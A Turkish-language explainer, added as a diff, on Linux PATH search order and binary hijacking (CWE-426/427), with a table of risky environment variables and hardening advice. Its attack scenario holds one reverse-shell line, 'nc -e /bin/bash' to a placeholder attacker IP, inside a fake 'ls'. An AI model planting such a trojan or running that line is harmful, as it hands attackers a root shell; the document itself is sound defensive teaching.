@@ -1,0 +1,56 @@
+==============================================================================
+TEMSİLÎ — AI İLLÜSTRASYONU — GERÇEK TEST DEĞİL
+==============================================================================
+LİNUX / POSIX PATH ARAMA SIRASI VE GÖLGELENME (HIJACKING) MİMARİSİ
+==============================================================================
+
+1. ÇEKİRDEK VE KABUK KOMUT ÇÖZÜMLEME SIRASI (SOLDAN SAĞA)
+
+   Kullanıcı Komutu:  $ ls -la
+                           |
+                           v
+   PATH Değişkeni:  [ Adım 1 ]  -->  [ Adım 2 ]  -->  [ Adım 3 ]  -->  [ Adım 4 ]
+                    /usr/local/bin    /usr/bin          /bin           /usr/games
+                           |                 |
+                  Bulunamadı (Miss)    Bulundu! (Hit)
+                                             |
+                                    /usr/bin/ls çalıştırılır
+
+2. BAĞIL YOL ('.') VE GÜVENİLMEYEN DİZİN GASPI (CWE-426 & CWE-427)
+
+   Zafiyetli PATH:  .:/usr/local/bin:/usr/bin:/bin
+                    ^
+                    |--- Tehlike: Geçerli çalışma dizini en başta!
+
+   Saldırı Senaryosu (Trojan Binary Hijacking):
+   1. Saldırgan paylaşımlı veya ortak bir dizine (`/tmp/proje`) sahte bir `ls`
+      betiği yerleştirir (içeriğinde `nc -e /bin/bash saldirgan_ip 4444` vardır).
+   2. Sistem yöneticisi veya root bu dizine girip rutin olarak `ls` yazar.
+   3. Kabuk PATH'in ilk sırasındaki `.` (mevcut dizin) kontrol eder.
+   4. `/usr/bin/ls` yerine saldırganın sahte `./ls` betiği çalışır!
+   5. Saldırgan yönetici (root) yetkileriyle sisteme sızar (Privilege Escalation).
+
+3. TEHLİKELİ ORTAM DEĞİŞKENLERİ VE İSTİSMAR VEKTÖRLERİ
+
+   +-------------------+--------------------+------------------------------------+
+   | Değişken Adı      | Standart / CWE     | İstismar Mekanizması / Tehdit      |
+   +-------------------+--------------------+------------------------------------+
+   | PATH (.: veya ::) | CWE-426            | Komut gölgeleme / Sahte ikili      |
+   | PATH (/tmp)       | CWE-427            | Ortak alana sahte ikili enjeksiyonu|
+   | LD_PRELOAD        | CWE-114            | Dinamik paylaşımlı kütüphane hook  |
+   | LD_LIBRARY_PATH   | CWE-114            | Sahte .so kütüphanesi yükletme     |
+   | DB_PASSWORD       | CWE-526            | /proc/PID/environ üzerinden ifşa   |
+   | IFS (Internal Sep)| Shell Injection    | Parametre ayrıştırıcısını bozma    |
+   +-------------------+--------------------+------------------------------------+
+
+4. EN İYİ UYGULAMA (DEFENSE-IN-DEPTH)
+
+   * Betiklerde ve Cron işlerinde asla çıplak komut (`ls`, `tar`) kullanma!
+     Her zaman tam yol belirt: `/bin/ls`, `/bin/tar`, `/usr/bin/curl`.
+   * Sistem genelinde PATH'i güvenli kıl:
+     `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
+   * Hassas anahtarları ortam değişkeni yerine HashiCorp Vault veya Linux Keyring'de sakla.
+
+==============================================================================
+TEMSİLÎ — AI İLLÜSTRASYONU — GERÇEK TEST DEĞİL
+==============================================================================
